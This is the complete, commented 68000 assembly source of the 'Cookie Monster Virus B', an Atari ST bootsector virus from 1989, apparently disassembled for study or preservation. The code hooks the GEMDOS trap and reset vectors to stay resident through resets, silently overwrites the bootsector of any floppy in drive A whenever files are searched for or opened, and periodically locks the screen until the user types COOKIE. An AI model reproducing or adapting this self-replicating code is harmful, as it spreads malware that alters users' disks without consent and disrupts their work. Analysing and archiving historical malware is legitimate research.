; Virus #33
; Name: Cookie Monster Virus B.
; Type: Reset-proof memory-resident bootsector virus.
; Discovery date: December 28th 1989.
; Virus can copy to drive(s): A.
; Virus attaches itself to: GEMDOS trap vector and RESVECTORtor.
; Disks can be immunized against it: No.
; What can happen: 
; - Writes "YOU KNOW WHAT? I WANT A COOKIE!" on the screen, and then waits for the user to type COOKIE. After having done this, it will enable the user to continue whatever he was doing.
; - Causes application errors (probably linked to the 2 Gemdos caught calls)
; - Replicates on any floppy inserted in A, executable bootsector or not, if the following Gemdos functions are called: Fsfirst, FOpen
; When does that happen: After 30 copies of itself are made, then after each 20th copy.
; Reset-proof: Yes.
; Can copy to hard disk: No.
; Remarks: 
; - The only difference with virus #32 is that it is reset-proof.
; - Works only on TOS 1.02

 
 TEXT 

; ----------------------------------------------------------------------------------------------------------
; Constants
; ----------------------------------------------------------------------------------------------------------
TRAP_1              equ $84                                 ; SD: Trap #1 (GemDOS) instruction vector, Vector for the 'TRAP #1' instruction. Points to the Dispatcher for the GEMDOS functions.                                             
RAM_LOCATION        equ $140                                ; free user vector space where the virus is hidding and stay resident after warm reset
RESET_VECTOR_ADDR   equ RAM_LOCATION+(RESET_VECTOR-Start)   ; 0x186
TRAP_VECTOR_ADDR    equ RAM_LOCATION+(TRAP_VECTOR-Start)    ; 0x196  

BOOTSECTOR_START    equ $601C                               ; bootsector branch
FLOPPY_BUF          equ $4000                               ; buffer in RAM to store bootsector read/write
TOS_MEMINIT         equ $FC0084                             ; TOS 1.0 diagnostics cart check routine
RESVECTOR           equ $42A                                ; $00042A|long |Reset vector (RESVECTORtor)
RESVALID            equ $426                                ; resvalid: $000426|long |Validates RESVECTORtor if $31415926  
RESVECTOR_MAGIC     equ $31415926                           ; magic number to setup the reset vector
GEMDOS_FSFIRST      equ $4E                                 ; Search for first file entry
GEMDOS_FOPEN        equ $3D                                 ; Open a given file
ACTIVATION_VALUE    equ 30                                  ; number of replications before activating the symptoms

; ----------------------------------------------------------------------------------------------------------
; Entry point
; ----------------------------------------------------------------------------------------------------------
Start:
        LEA       COUNTER(PC),A0                ; A0 = ptr to relocated counter 
        MOVE.B    #ACTIVATION_VALUE,(A0)        ; set counter == 30
        LEA       GO_TO_ORIGINAL_VECTOR(PC),A0  ; A0 = JMP instruction     
        MOVE.L    TRAP_1.L,2(A0)                ; patch address to TRAP_1 vector

        ; copy virus in RAM
        LEA       Start(PC),A0                  ; A0 = ptr to relocated Start
        MOVEQ     #$7F,D0                       ; for D0 = 127 to 0 (512 bytes)
        MOVEA.L   #RAM_LOCATION,A1              ; A1 = $140
.copy:  MOVE.L    (A0)+,(A1)+                   ; copy virus to $140
        DBF       D0,.copy

        ; Set Trap 1 Gemdos Trap Instruction Vectors
        MOVE.L    #TRAP_VECTOR_ADDR,TRAP_1.L    ; Set Trap 1 vector to TRAP_VECTOR_ADDR (0x196)
        MOVE.L    #RESVECTOR_MAGIC,RESVALID.L   ; Set RESVECTOR magic value
        MOVE.L    #RESET_VECTOR_ADDR,RESVECTOR.L; Set RESVECTOR vector to RESET_VECTOR_ADDR (0x186)
        RTS 

; ----------------------------------------------------------------------------------------------------------
; Reset Vector
; ----------------------------------------------------------------------------------------------------------
RESET_VECTOR:                                   ; located at $186 (RESET_VECTOR_ADDR)
        MOVE.L    #TRAP_VECTOR_ADDR,TRAP_1.L    ; Reset TRAP_VECTOR_ADDR
        JMP       TOS_MEMINIT                   ; jump to TOS 1.x meminit entry point (https://github.com/th-otto/tos1x/blob/master/bios/startup.S#L248C1-L248C8)

; ----------------------------------------------------------------------------------------------------------
; Trap #1 Vector
; ----------------------------------------------------------------------------------------------------------
TRAP_VECTOR:
        MOVEM.L   A0-A1/D0,-(sp)                ; located at $196 (TRAP_VECTOR_ADDR)
        MOVE.W    12(sp),D0                     ; 
        ANDI.W    #$2000,D0                     ; D0 = D0 AND 0x1000 0110, not sure what it filter
        BEQ       .use_usp                      ; if 0 then get the USP
        MOVEA.L   sp,A0                         ; else get the SP and go the the 18th byte
        LEA       18(A0),A0                     
        BRA       .check_gemdos_call 
.use_usp:  
        MOVE      USP,A0                        ; This instruction is used to move data to and from an address register with the user stack pointer (sp). 
                                                ; So the contents of the stack pointer used in the user mode can be moved to nominated address register or 
                                                ; alternatively the specified address register can be moved to the user stack pointer.
.check_gemdos_call:  
        MOVE.W    (A0),D0                       ; Get USP or 18(sp) value to D0
        CMP.W     #GEMDOS_FSFIRST,D0            ; Replicate if Fsfirst gemdos call 
        BEQ       REPLICATE
        CMP.W     #GEMDOS_FOPEN,D0              ; Replicate if FOpen gemdos call 
        BNE       NOTHING_TO_DO 

; ----------------------------------------------------------------------------------------------------------
; Replication routine
; ----------------------------------------------------------------------------------------------------------
REPLICATE:  
        ; read boosector
        MOVE.W    #1,-(sp)                      ; count = 1 
        CLR.W     -(sp)                         ; side = 0
        CLR.W     -(sp)                         ; track = 0
        MOVE.W    #1,-(sp)                      ; sector = 1
        CLR.W     -(sp)                         ; dev = A
        CLR.L     -(sp)                         ; rsrvd = 0
        MOVE.L    #FLOPPY_BUF,-(sp)             ; buf = $4000 (FLOPPY_BUF)
        MOVE.W    #8,-(sp)                      ; FLOPRD 
        TRAP      #$E                   
        LEA       20(sp),sp                     ; fix stack
        TST.L     D0                            ; check read status
        BNE       NOTHING_TO_DO 
        MOVEA.L   #FLOPPY_BUF,A0                ; A0 = FLOPPY_BUF
        MOVE.W    #BOOTSECTOR_START,(A0)        ; Add branch at start
        LEA       30(A0),A0                     ; advance of $1C+2 = $1E (30)
        MOVEA.L   #RAM_LOCATION,A1              ; A1 = virus ram location
        MOVE.W    #$77,D0                       ; For D0 = 119 to 0
.copy:  MOVE.L    (A1)+,(A0)+                   ; copy virus to buffer for 480 bytes
        DBF       D0,.copy

        ; create executable bootsector
        MOVE.W    #1,-(sp)                      ; execflag = 1 (executable)
        MOVE.W    #$FFFF,-(sp)                  ; disktype = unchanged (-1)
        MOVE.L    #$FFFFFFFF,-(sp)              ; serial = 0xFFFFFFFF
        MOVE.L    #FLOPPY_BUF,-(sp)             ; buf = FLOPPY_BUF
        MOVE.W    #$12,-(sp)                    ; void protobt(long buffer, long serialno, int disktype, int execflag)
        TRAP      #$E 
        LEA       14(sp),sp                     ; fix stack

        ; write bootsector
        MOVE.W    #1,-(sp)                      ; count = 1 
        CLR.W     -(sp)                         ; side = 0
        CLR.W     -(sp)                         ; track = 0
        MOVE.W    #1,-(sp)                      ; sector = 1
        CLR.W     -(sp)                         ; dev = A
        CLR.L     -(sp)                         ; rsrvd = 0
        MOVE.L    #FLOPPY_BUF,-(sp)             ; buf = $4000 (FLOPPY_BUF)
        MOVE.W    #9,-(sp)                      ; FLOPWR 
        TRAP      #$E 
        LEA       20(sp),sp                     ; fix stack

        LEA       COUNTER(PC),A0                ; A0 = counter
        SUBI.B    #1,(A0)                       ; decrement counter (started at 30)
        BEQ       PRINT_LINE1                   ; if 0, print line!
NOTHING_TO_DO:
        MOVEM.L   (sp)+,A0-A1/D0
GO_TO_ORIGINAL_VECTOR:
        JMP       $FC4F6E                       ; will be patched by default TRAP 1 vector

; ----------------------------------------------------------------------------------------------------------
; Print line 1 routine
; ----------------------------------------------------------------------------------------------------------
PRINT_LINE1:
        MOVE.B    #$14,(A0)                     ; reset counter t0 20
        MOVEM.L   A3/D3,-(sp)                   ; 
        LEA       MESSAGE1(PC),A0               ; 
        MOVE.L    A0,-(sp)                      ; str = MESSAGE1 addr
        MOVE.W    #9,-(sp)                      ; VOID Cconws( str ) 
        TRAP      #1
        ADDQ.W    #6,sp                         ; fix stack

; ----------------------------------------------------------------------------------------------------------
; Print line 2 routine
; ----------------------------------------------------------------------------------------------------------
PRINT_LINE2:
        LEA       MESSAGE2(PC),A0               ; 
        MOVE.L    A0,-(sp)                      ; str = MESSAGE2 addr
        MOVE.W    #9,-(sp)                      ; VOID Cconws( str ) 
        TRAP      #1
        ADDQ.W    #6,sp                         ; fix stack
        LEA       PASSWORD(PC),A3               ; A3 = PASSWORD addr
        MOVE.W    #5,D3                         ; d3 = 5 = password length

; ----------------------------------------------------------------------------------------------------------
; Wait answer routine
; ----------------------------------------------------------------------------------------------------------
CHECK_PASSWORD:
        MOVE.W    #1,-(sp)                      ; LONG Cconin( VOID ) Cconin() reads a character (waiting until one is available) 
        TRAP      #1
        ADDQ.W    #2,sp                         ; fix stack
        CMP.B     #$61,D0                       ; if key >= 'a' typed
        BGE       .upper_ascii                         
.again:  
        CMP.B     (A3)+,D0                      ; compare character with PASSWORD character position
        BNE.S     PRINT_LINE2                   ; go back if different
        DBF       D3,CHECK_PASSWORD             ; decrease password len, if done leave
        MOVEM.L   (sp)+,A3/D3 
        BRA.S     NOTHING_TO_DO 
.upper_ascii:  
        CMP.B     #$7A,D0                       ; if key > 'z' typed
        BGT.S     .again                        ; go back to print
        BCLR      #5,D0                         ; else Test Bit and Clear it on d0 ???
        BRA.S     .again                        ; go back

; ----------------------------------------------------------------------------------------------------------
; Data
; ----------------------------------------------------------------------------------------------------------
MESSAGE2:
        DC.B      $0A,$0D,'I WANT A ' 
PASSWORD:  
        DC.B      'COOKIE! ',$0D,$0A,$00 
COUNTER:
        DC.B      $13 
MESSAGE1:
        DC.B      $1B,'EYOU KNOW WHAT?,'
FILLER:        
        DCB.W     51,0
    END
